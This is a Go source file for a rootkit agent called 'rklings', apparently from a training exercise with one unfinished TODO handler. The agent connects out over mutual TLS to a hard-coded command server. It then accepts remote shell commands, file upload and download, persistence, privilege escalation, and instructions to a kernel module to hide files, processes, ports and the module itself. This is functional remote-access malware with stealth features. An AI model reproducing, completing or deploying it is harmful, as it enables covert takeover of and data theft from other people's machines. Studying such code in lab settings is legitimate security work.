package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"crypto/x509"
	_ "embed"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/creack/pty"
)

//go:embed certs/ca.crt
var caCert []byte

//go:embed certs/agent.crt
var agentCert []byte

//go:embed certs/agent.key
var agentKey []byte

const defaultServerAddr = "10.0.2.2:8443"

func main() {
	for {
		conn, err := dial()
		if err != nil {
			time.Sleep(2 * time.Second)
			continue
		}
		serve(conn)
		_ = conn.Close()
		time.Sleep(2 * time.Second)
	}
}

func serve(conn *tls.Conn) {
	r := bufio.NewReader(conn)
	for {
		line, err := r.ReadString('\n')
		if err != nil {
			return
		}
		line = strings.TrimRight(line, "\r\n")
		parts := strings.SplitN(line, " ", 2)
		cmd := parts[0]
		arg := ""
		if len(parts) > 1 {
			arg = parts[1]
		}

		switch cmd {
		case "PING":
			fmt.Fprintln(conn, "PONG")
		case "STATUS":
			fmt.Fprintf(conn, "PID=%d UID=%d\n", os.Getpid(), os.Getuid())
		case "INFO":
			handleInfo(conn)
		case "SHELL":
			handleShell(conn, arg)
		case "PTY":
			handlePTY(conn, arg)
		case "DOWNLOAD":
			handleDownload(conn, arg)
		case "UPLOAD":
			handleUpload(conn, r, arg)
		case "HIDE":
			handleHide(conn, arg)
		case "UNHIDE":
			handleUnhide(conn, arg)
		case "PERSIST":
			if err := trigger("persist"); err != nil {
				fmt.Fprintf(conn, "ERR %v\n", err)
			} else {
				control.Lock()
				control.persisted = true
				control.Unlock()
				fmt.Fprintln(conn, "OK")
			}
		case "ESCALATE":
			handleEscalate(conn, arg)
		default:
			fmt.Fprintf(conn, "ERR unknown: %s\n", cmd)
		}
	}
}

var control = struct {
	sync.Mutex
	hidden    map[string][]string
	persisted bool
}{hidden: map[string][]string{"file": {}, "content": {}, "pid": {}, "port": {}}}

type agentInfo struct {
	Hostname     string              `json:"hostname"`
	Kernel       string              `json:"kernel"`
	Arch         string              `json:"arch"`
	PID          int                 `json:"pid"`
	UID          int                 `json:"uid"`
	ModuleHidden bool                `json:"module_hidden"`
	Persisted    bool                `json:"persisted"`
	Hidden       map[string][]string `json:"hidden"`
}

func handleInfo(conn *tls.Conn) {
	hostname, _ := os.Hostname()
	kernelBytes, _ := os.ReadFile("/proc/sys/kernel/osrelease")
	_, moduleExists := os.Stat("/sys/module/rklings")
	modules, _ := os.ReadFile("/proc/modules")
	control.Lock()
	hidden := make(map[string][]string, len(control.hidden))
	for kind, values := range control.hidden {
		hidden[kind] = append([]string(nil), values...)
	}
	info := agentInfo{
		Hostname: hostname, Kernel: strings.TrimSpace(string(kernelBytes)), Arch: runtime.GOARCH,
		PID: os.Getpid(), UID: os.Getuid(), Persisted: control.persisted, Hidden: hidden,
		ModuleHidden: moduleExists == nil && !bytes.Contains(modules, []byte("rklings ")),
	}
	control.Unlock()
	data, err := json.Marshal(info)
	if err != nil {
		fmt.Fprintf(conn, "ERR %v\n", err)
		return
	}
	fmt.Fprintf(conn, "INFO %s\n", data)
}

func trigger(command string) error {
	path := "rklings." + command
	if err := os.Mkdir(path, 0755); err != nil && !os.IsExist(err) {
		return err
	}
	return os.Remove(path)
}

var shellPTY struct {
	sync.Mutex
	file   *os.File
	output []byte
}

func handlePTY(conn *tls.Conn, arg string) {
	// TODO: implement START, INPUT, RESIZE, and CLOSE against shellPTY. Encode
	// binary input/output as base64 and protect all shared PTY state with its
	// mutex. Every non-error response uses "DATA <base64>".
	fmt.Fprintln(conn, "ERR implement PTY lifecycle")
}

func readPTY(file *os.File) {
	buf := make([]byte, 4096)
	for {
		n, err := file.Read(buf)
		if n > 0 {
			shellPTY.Lock()
			if shellPTY.file == file {
				shellPTY.output = append(shellPTY.output, buf[:n]...)
			}
			shellPTY.Unlock()
		}
		if err != nil {
			return
		}
	}
}

func dial() (*tls.Conn, error) {
	serverAddr := os.Getenv("RKLINGS_SERVER_ADDR")
	if serverAddr == "" {
		serverAddr = defaultServerAddr
	}
	cert, err := tls.X509KeyPair(agentCert, agentKey)
	if err != nil {
		return nil, fmt.Errorf("load agent cert: %w", err)
	}

	pool := x509.NewCertPool()
	pool.AppendCertsFromPEM(caCert)

	return tls.Dial("tcp", serverAddr, &tls.Config{
		Certificates: []tls.Certificate{cert},
		RootCAs:      pool,
		MinVersion:   tls.VersionTLS13,
	})
}

func handleShell(conn *tls.Conn, cmd string) {
	out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
	if err != nil {
		fmt.Fprintf(conn, "ERR %v\n", err)
	}
	if len(out) > 0 {
		conn.Write(out)
		if out[len(out)-1] != '\n' {
			fmt.Fprintln(conn)
		}
	}
	fmt.Fprintln(conn, ".")
}

func handleDownload(conn *tls.Conn, path string) {
	info, err := os.Stat(path)
	if err != nil {
		fmt.Fprintf(conn, "ERR %v\n", err)
		return
	}

	f, err := os.Open(path)
	if err != nil {
		fmt.Fprintf(conn, "ERR %v\n", err)
		return
	}
	defer f.Close()

	fmt.Fprintf(conn, "%d\n", info.Size())
	io.Copy(conn, f)
}

func handleUpload(conn *tls.Conn, r *bufio.Reader, path string) {
	sizeLine, err := r.ReadString('\n')
	if err != nil {
		fmt.Fprintln(conn, "ERR no size line")
		return
	}
	size, err := strconv.ParseInt(strings.TrimSpace(sizeLine), 10, 64)
	if err != nil {
		fmt.Fprintf(conn, "ERR bad size: %v\n", err)
		return
	}

	f, err := os.Create(path)
	if err != nil {
		fmt.Fprintf(conn, "ERR %v\n", err)
		return
	}
	defer f.Close()

	// Read from the buffered reader, not the raw conn.
	_, err = io.CopyN(f, r, size)
	if err != nil {
		fmt.Fprintf(conn, "ERR %v\n", err)
		return
	}
	fmt.Fprintln(conn, "OK")
}

func handleHide(conn *tls.Conn, arg string) {
	parts := strings.SplitN(arg, " ", 2)
	if parts[0] == "MODULE" {
		if err := trigger("h.m"); err != nil {
			fmt.Fprintf(conn, "ERR %v\n", err)
			return
		}
		fmt.Fprintln(conn, "OK")
		return
	}
	if len(parts) < 2 {
		fmt.Fprintln(conn, "ERR need: HIDE <type> <value>")
		return
	}

	prefixes := map[string]string{
		"FILE": "h.f", "PID": "h.i", "PORT": "h.p", "CONTENT": "h.c",
	}
	prefix, ok := prefixes[parts[0]]
	if !ok {
		fmt.Fprintf(conn, "ERR unknown hide type: %s\n", parts[0])
		return
	}

	if err := trigger(prefix + "." + parts[1]); err != nil {
		fmt.Fprintf(conn, "ERR %v\n", err)
		return
	}
	control.Lock()
	control.hidden[strings.ToLower(parts[0])] = append(control.hidden[strings.ToLower(parts[0])], parts[1])
	control.Unlock()
	fmt.Fprintln(conn, "OK")
}

func handleUnhide(conn *tls.Conn, arg string) {
	parts := strings.SplitN(arg, " ", 2)
	if parts[0] == "MODULE" {
		if err := trigger("u.m"); err != nil {
			fmt.Fprintf(conn, "ERR %v\n", err)
			return
		}
		fmt.Fprintln(conn, "OK")
		return
	}
	if len(parts) != 2 {
		fmt.Fprintln(conn, "ERR need: UNHIDE <type> <value>")
		return
	}
	prefixes := map[string]string{"FILE": "u.f", "PID": "u.i", "PORT": "u.p", "CONTENT": "u.c"}
	prefix, ok := prefixes[parts[0]]
	kind := strings.ToLower(parts[0])
	control.Lock()
	values := control.hidden[kind]
	index := -1
	for i, value := range values {
		if value == parts[1] {
			index = i
			break
		}
	}
	valid := ok && index >= 0
	control.Unlock()
	if !valid {
		fmt.Fprintln(conn, "ERR invalid target")
		return
	}
	if err := trigger(prefix + "." + parts[1]); err != nil {
		fmt.Fprintf(conn, "ERR %v\n", err)
		return
	}
	control.Lock()
	values = control.hidden[kind]
	control.hidden[kind] = append(values[:index], values[index+1:]...)
	control.Unlock()
	fmt.Fprintln(conn, "OK")
}

func handleEscalate(conn *tls.Conn, arg string) {
	if arg != "" {
		os.Mkdir("rklings.e."+arg, 0755)
	} else {
		os.Mkdir("rklings.e", 0755)
	}
	fmt.Fprintln(conn, "OK")
}
